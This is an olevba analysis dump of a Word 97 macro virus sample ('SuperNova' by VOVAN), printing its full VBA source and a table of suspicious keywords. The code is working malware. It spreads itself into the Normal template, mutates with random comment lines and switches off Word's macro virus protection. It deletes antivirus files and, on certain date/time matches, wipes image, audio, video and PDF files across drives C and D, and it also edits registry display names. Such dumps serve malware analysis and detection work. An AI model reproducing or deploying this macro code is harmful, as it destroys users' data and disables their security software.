olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vovan.c-ebbc631e5826fbc916cf5f054b7a6f6daba43910
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vovan.c-ebbc631e5826fbc916cf5f054b7a6f6daba43910 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xxx.bas 
in file: Virus.MSWord.Vovan.c-ebbc631e5826fbc916cf5f054b7a6f6daba43910 - OLE stream: 'Macros/VBA/xxx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'MacroWord97.SuperNova by VOVAN
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sub AutoOpen()
On Error Resume Next
Polymorphic
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub AutoExit()
On Error Resume Next
Application.ScreenUpdating = False
Options.SaveNormalPrompt = False
If Day(Now()) = Month(Now()) Then Call Abc
If Day(Now()) = Minute(Now()) Then Call Abc
If Day(Now()) = Hour(Now()) Then Call Abc
If Day(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Minute(Now()) Then Call Abc
If Hour(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = WeekDay(Now()) Then Call Abc
If Month(Now()) = WeekDay(Now()) Then Call Abc
Options.VirusProtection = True
End Sub
Sub AutoExec()
On Error Resume Next
Options.VirusProtection = False
End Sub
Sub FileOpen()
On Error Resume Next
WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Call FileSave
End Sub
Sub FileSave()
On Error Resume Next
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
Polymorphic
ActiveDocument.Save
End Sub
'Sub FileSaveAs()
'On Error Resume Next
'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
'Polymorphic
'Dialogs(wdDialogFileSaveAs).Show
'End Sub
Sub ToolsMacro()
Call AntiAvp
End Sub
Sub FileTemplates()
Call AntiAvp
End Sub
Sub ViewVBcode()
Call AntiAvp
End Sub
Sub Organizer()
Call AntiAvp
End Sub
Sub ToolsRecordMacroStart()
Call AntiAvp
End Sub
Sub ToolsRecordMacroToggle()
Call AntiAvp
End Sub
Sub Polymorphic()
On Error Resume Next
xXxX = Int(Rnd() * 6 + 1)
For Mutagen = 1 To xXxX
ZzZz = Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.CountOfLines
qwer = Int(Rnd() * ZzZz + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.InsertLines qwer, "Rem " & a & vbTab & b & vbTab & c & vbTab & D & vbTab & e
Next Mutagen
End Sub
Sub Abc()
On Error Resume Next
Dim D
Randomize
D = Int((4 * Rnd) + 1)
If D = 1 Then GoTo Picture
If D = 2 Then GoTo Sound
If D = 3 Then GoTo Video
If D = 4 Then End
Picture:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.jpg ; *.bmp ; *.gif ; *.pcx ; *.png ; *.tif ; *.tga ; *.psd ; *.pdd ; *.iff ; *.rle ; *.eps ; *.fpx ; *.jpe ; *.ani ; *.ico ; *.cur ; *.wif ; *.dcx ; *.lbm ; *.wmf ; *.pif"
fs.Execute
For G = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(G), 0
Kill fs.FoundFiles(G)
Next G
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.pdf ; *.pct ; *.pic ; *.pxr ; *.rng ; *.raw ; *.sct ; *.vda ; *.icb ; *.vst ; *.xfp ; *.xfd ; *.lpi ; *.ans ; *.rip ; *.icl ; *.pcd ; *.xif ; *.dib ; *.jif ; *.awd ; *.lnk"
fs.Execute
For Y = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Y), 0
Kill fs.FoundFiles(Y)
Next Y
GoTo 1
Sound:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.wav ; *.mid ; *.rmi ; *.mod ; *.snd ; *.stm ; *.s3m ; *.voc ; *.mtm ; *.mpg ; *.mp2 ; *.mp3"
fs.Execute
For J = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(J), 0
Kill fs.FoundFiles(J)
Next J
GoTo 1
Video:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.avi ; *.dvp ; *.mov ; *.flc ; *.fli ; *.flx ; *.mpg ; *.c3d ; *.c2d"
fs.Execute
For O = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(O), 0
Kill fs.FoundFiles(O)
Next O
1:
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Ìîé êîìïüþòåð" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Íàø êîìïüþòåð"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Íàø êîìïüþòåð"
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "My computer" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Our computer"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Our computer"
End If
End Sub
Sub ToolsOptions()
On Error Resume Next
With Options: .VirusProtection = True: End With
With Options: .SaveNormalPrompt = True: End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options: .VirusProtection = False: End With
End Sub
Sub AntiAvp()
On Error Resume Next
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "avp*.* ; *.avc ; drweb*.*"
fs.Execute
For Z = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Z), 0
Kill fs.FoundFiles(Z)
Next Z
End Sub
'***************************************
'* Author of given MacroVirus is VOVAN *
'*         MacroVirus.Word97           *
'*         Name of SuperNova           *
'*             Ver 1.0                 *
'***************************************

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

